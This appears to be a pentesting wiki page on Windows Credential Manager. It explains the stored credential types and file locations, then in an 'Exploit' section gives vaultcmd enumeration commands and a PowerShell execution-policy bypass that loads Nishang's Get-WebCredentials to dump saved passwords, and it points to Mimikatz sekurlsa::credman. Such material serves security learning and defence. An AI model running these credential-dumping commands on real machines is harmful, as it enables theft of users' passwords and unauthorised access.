## Theory
Windows Credential Manager is a built-in feature that securely stores sensitive login information for websites, applications, and networks. It houses login credentials such as usernames, passwords, and web addresses. There are four distinct categories of stored credentials:

- Web-based credentials: authentication details saved in web browsers (or other applications)
- Windows-specific credentials: authentication data such as NTLM or Kerberos
- Generic credentials: fundamental authentication data, such as clear-text usernames and passwords
- Certificate-based credentials: comprehensive information based on certificates
### Credential Manager Storage Location
| **Type**                            | **Path**                                                     |
| ----------------------------------- | ------------------------------------------------------------ |
| **Credential Store Files**          | `C:\Users\<username>\AppData\Local\Microsoft\Credentials\`   |
| **Credential Metadata**             | `C:\Users\<username>\AppData\Roaming\Microsoft\Credentials\` |
| **Credential Vault (GUID folders)** | `C:\ProgramData\Microsoft\Vault\`                            |

- The files in these directories have random-looking names (like {5fbc...}.cred) and are not human-readable.

- These are encrypted using DPAPI (Data Protection API) and are tied to the user's Windows logon credentials.
## Exploit
From Windows systems, vaultcmd.exe can be used to enumerate, check and list Microsoft Credentials. However, this tool does not allow to see clear text passwords as it is an official, native, Windows program.
```bash
#enumerate current Windows safes available
vaultcmd /list

#Check for credentials stored in the vault
VaultCmd /listproperties:"$coffre_name"

#more information about the Vault 
VaultCmd /listcreds:"$coffre_name"
```
The vault can be dumped in with [Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1) (PowerShell).
```bash
powershell -ex bypass

Import-Module C:\Get-WebCredentials.ps1

Get-WebCredentials
```
Alternatively, Mimkatz (C) can be used for that purpose, with `sekurlsa::credman`.

